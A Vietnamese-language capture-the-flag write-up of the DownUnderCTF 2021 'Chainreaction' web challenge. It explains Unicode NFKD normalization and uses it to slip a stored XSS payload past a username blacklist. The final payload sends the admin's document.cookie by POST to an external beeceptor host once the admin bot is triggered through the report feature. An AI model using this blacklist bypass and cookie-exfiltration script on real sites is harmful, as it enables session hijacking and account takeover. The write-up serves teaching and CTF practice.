---
title: Chainreaction - DownUnderCTF 2021
author: HoangND
date: 2021-09-25 15:55:00 +0700
categories: [Writeups, DownUnderCTF 2021]
tags: [xss, web, unicode normalised]
---

## Recon

![image](https://user-images.githubusercontent.com/61985236/134768470-0e313bc6-67b4-487a-9542-1ebcc067b6ce.png){:} Trang chủ

Trang chủ của Chainreaction không có gì đáng bận tâm, ngoại trừ việc ảnh không load được, nhưng hiện tại vẫn không biết lí do thôi bỏ qua. Có hai button đăng ký đăng nhập. 
Ở đây các form này không khai thác được SQLi. Quan sát một chút form đăng ký

![image](https://user-images.githubusercontent.com/61985236/134768675-1fec4bb8-fc48-4249-b28e-fa60a39efc4a.png){:} Trang đăng ký

Username không được chứa các ký tự < và >. Vậy khả năng cao có thể bypass để khai thác lỗi XSS qua username. Cũng có một điều đặc biệt bên dưới form đăng nhập làm mình chú ý

![image](https://user-images.githubusercontent.com/61985236/134768537-778e468c-5013-4c07-968d-13b121315325.png){: style="max-width: 60%" } Trang đăng nhập

vậy là có trang đăng nhập riêng cho deverloper, vào luôn xem có gì hay ho

![image](https://user-images.githubusercontent.com/61985236/134768551-75408121-ca67-4966-9463-d759f69f5a25.png){: style="max-width: 100%" } Trang đăng nhập cho developer

Hiểu sương sương nghĩa là nếu bạn có tài khoản thì có thể vào đường dẫn /devchat, đặc biệt hơn nếu có tài khoản admin thì có thể vào /admin. Hiện tại đương nhiên mình không thể vào trang admin được rồi, 
ngó devchat xem có gì

![image](https://user-images.githubusercontent.com/61985236/134768594-a9f1049f-714b-4279-84cf-5c907c803954.png){: style="max-width: 60%" } /devchat

Vậy là có hẳn một trang public luôn đoạn chat nội bộ, đúng với mô tả của challenge 'Hệ thống được xây dựng bởi các sinh viên của trường đại học' 🤣🤣🤣. Đoạn chat có đề cập đến NFKD => NFKD normalised exploit. Tiếp theo tạo một tài khoản và đăng nhập, thì có thêm trang profile cho phép thay đổi thông tin cá nhân

![image](https://user-images.githubusercontent.com/61985236/134777616-375ddcc1-647c-47e6-848f-eb48744a8daa.png){: style="max-width: 60%" } /devchat

Ta thấy rằng username được hiển thị lên giao diện thông qua lời chào welcome, thử XSS ở đây xem thế nào.

![image](https://user-images.githubusercontent.com/61985236/134777639-266d3c3e-f3ed-4db0-8554-c2453e777a6f.png)

Như vậy hệ thống sử dụng blacklist để kiểm tra thông tin username. Như đã đề cập ở trên, đoạn chat có nhắc đến cái gọi là NFKD, vậy chính xác NFKD là gì và khai thác thế nào mình sẽ trình bày ngắn gọn dưới đây.

## Unicode Normalization vulnerability 

Normalization (chuẩn hóa) là quá trình thay đổi độ dài biểu diễn nhị phân đối với một ký tự cụ thể. Có hai kiểu tương đương giữa các ký tự là Canonical Equivalence và Compatibility Equivalence (mình không biết nên đưa về tiếng việt thế nào)
- Các ký tự tương đương theo kiểu Canonical Equivalence sẽ có cùng biểu diễn khi in hoặc hiển thị.
- Trong khi đó Compatibility Equivalence là kiểu tương đương mềm dẻo hơn khi biểu diễn của hai ký tự tương đương theo kiểu này có thể khác nhau.
Có 4 thuật toán chuẩn hóa được định nghĩa theo chuẩn Unicode: NFC, NFD, NFKD và NFKD, mỗi loại áp dụng kỹ thuật chuẩn hóa Canonical và Compatibility theo cách khác nhau. Bạn có thể đọc thêm về các kỹ thuật khác nhau tại Unicode.org.

Chuẩn hóa Compatibility mềm dẻo hơn do đó có thể bị hacker khai thác để vược qua blacklist. Ví dụ ký tự '⑧' sau khi được chuẩn hóa theo kỹ thuật Compatibility sẽ thành ký tự '8', như vậy hacker có thể dùng ký tự này để vượt qua blacklist chứa '8'.

Để hiểu rõ hơn về Unicode Normalization cũng như cách khai thác, bạn có thể tham khảo [tài liệu sau](https://book.hacktricks.xyz/pentesting-web/unicode-normalization-vulnerability).

## Solve challenge
Như vậy đã hiểu sơ qua về các khai thác NFKD normalization. Bắt tay vào exploit thôi, các ký tự đại diện mình sẽ cần để bypass blacklist sẽ là
- ＜(%ef%bc%9c) thay cho ký tự <
- ＞(%ef%bc%9e) thay cho ký tự >
- ⁱ (%e2%81%b1) thay cho ký tự i

Các ký tự tương đương bạn có thể tìm ở [tài liệu sau](https://appcheck-ng.com/wp-content/uploads/unicode_normalization.html).
Test thử script cơ bản, sử dụng beeceptor như một mockup server để validate. Trường mình sử dụng để XSS sẽ là username trong trang profile

```
<script>
  var xhr = new XMLHttpRequest();
  xhr.open("GET","https://hoangnd.free.beeceptor.com");
  xhr.send();
</script>
```

Để bypass blacklist, mình sẽ thay thế các ký tự < > i bằng các ký tự tương đương ở trên (ký tự i để bypass chuỗi 'script'). Như vậy payload của mình sẽ là

```
%ef%bc%9cscr%e2%81%b1pt%ef%bc%9e
  var xhr = new XMLHttpRequest();
  xhr.open("GET","https://hoangnd.free.beeceptor.com");
  xhr.send();
%ef%bc%9c/scr%e2%81%b1pt%ef%bc%9e
```
Kết quả gửi request

![image](https://user-images.githubusercontent.com/61985236/134780213-5a10d8ba-d9c7-4964-ac05-88acec404486.png)

Vậy là đã tạo được một node script để chèn javascript, bên beeceptor cũng đã nhận được request

![image](https://user-images.githubusercontent.com/61985236/134780248-c3e390d4-f033-4648-97c8-b909cb7d7b95.png)

Oke, đến đây để mạo danh admin, cần phải có được cookie đăng nhập của admin. How ? Đầu tiên cần quay lại một chút trang chát chít của hội dev. Chính ông admin đã tiết lộ như sau

![image](https://user-images.githubusercontent.com/61985236/134780389-516004ed-1d2d-4b64-9d6b-8ca467f38ae5.png)

Do tính năng của trang admin chưa được hoàn thành, admin sẽ sử dụng 1 cookie tĩnh để xác thực, browser của admin chắc chắn còn lưu cookie này. Thế làm thế nào để admin mở profile tài khoản của mình để kích hoạt XSS gửi cookie về cho beeceptor? Câu trả lời nằm ở tính năng report ở trang profile

![image](https://user-images.githubusercontent.com/61985236/134780480-6e2a3b83-2fdc-4953-bad2-121450916e25.png)

Nghĩa là mình cứ ấn report là ông admin sẽ vào trang profile để check lỗi => XSS. Test nhanh kẻo nguội bằng payload sau

```
%ef%bc%9cscr%e2%81%b1pt%ef%bc%9e
  var c = document.cookie;
  var xhr = new XMLHttpRequest();
  xhr.open("POST","https://hoangnd.free.beeceptor.com/exploit");
  xhr.send(c);
%ef%bc%9c/scr%e2%81%b1pt%ef%bc%9e
```

![image](https://user-images.githubusercontent.com/61985236/134780741-24c0408b-9dce-4da6-a747-667e10a08d7b.png)

Tiếp theo là ấn report và quan sát bên beeceptor

![image](https://user-images.githubusercontent.com/61985236/134780783-21a99a0e-69dc-4e9e-bb5f-50cbeff2b536.png)

Vậy là đã lấy được cookie của admin, vào /admin lấy cờ thôi

![image](https://user-images.githubusercontent.com/61985236/134780811-72bcc33c-37a0-43c3-a85a-a9605df6b57f.png)

